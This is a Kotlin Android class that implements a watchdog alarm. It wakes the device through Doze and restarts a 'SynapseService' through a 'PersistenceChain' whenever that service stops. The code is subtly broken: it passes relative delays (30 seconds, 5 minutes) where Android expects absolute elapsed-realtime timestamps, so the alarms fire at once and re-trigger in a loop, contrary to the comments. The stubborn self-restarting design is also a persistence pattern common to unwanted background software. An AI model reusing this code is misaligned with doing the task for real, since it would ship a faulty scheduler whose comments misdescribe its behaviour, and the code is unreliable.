package org.synapse.core.persistence

import android.app.AlarmManager
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log

/**
 * Alarm-based watchdog that fires every 5 minutes.
 * Uses [AlarmManager.setExactAndAllowWhileIdle] to survive Doze mode.
 * On each tick, checks if the SynapseService is alive; restarts it if dead.
 */
class WatchdogAlarm : BroadcastReceiver() {

    companion object {
        private const val TAG = "Synapse"
        private const val ALARM_REQUEST_CODE = 9001
        const val ACTION_WATCHDOG_CHECK = "org.synapse.core.WATCHDOG_CHECK"

        /** Schedule the repeating alarm every 5 minutes. */
        fun schedule(context: Context) {
            val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
            val intent = Intent(context, WatchdogAlarm::class.java).apply {
                action = ACTION_WATCHDOG_CHECK
            }
            val flags = PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
            val pendingIntent = PendingIntent.getBroadcast(
                context, ALARM_REQUEST_CODE, intent, flags
            )

            alarmManager.setExactAndAllowWhileIdle(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                30_000L, // first fire in 30 seconds
                pendingIntent
            )

            Log.d(TAG, "WatchdogAlarm scheduled — first check in 30s")
        }

        fun cancel(context: Context) {
            val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
            val intent = Intent(context, WatchdogAlarm::class.java).apply {
                action = ACTION_WATCHDOG_CHECK
            }
            val flags = PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_NO_CREATE
            val pendingIntent = PendingIntent.getBroadcast(
                context, ALARM_REQUEST_CODE, intent, flags
            )
            pendingIntent?.let { alarmManager.cancel(it) }
        }
    }

    override fun onReceive(context: Context, intent: Intent) {
        Log.d(TAG, "WatchdogAlarm — tick")

        if (!PersistenceChain.isServiceRunning(context)) {
            Log.w(TAG, "WatchdogAlarm — service DEAD, restarting")
            PersistenceChain.start(context)
        } else {
            Log.d(TAG, "WatchdogAlarm — service alive")
        }

        // Reschedule next alarm
        val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val nextIntent = Intent(context, WatchdogAlarm::class.java).apply {
            action = ACTION_WATCHDOG_CHECK
        }
        val flags = PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        val pendingIntent = PendingIntent.getBroadcast(
            context, ALARM_REQUEST_CODE, nextIntent, flags
        )

        alarmManager.setExactAndAllowWhileIdle(
            AlarmManager.ELAPSED_REALTIME_WAKEUP,
            5 * 60 * 1000L, // 5 minutes
            pendingIntent
        )
    }
}
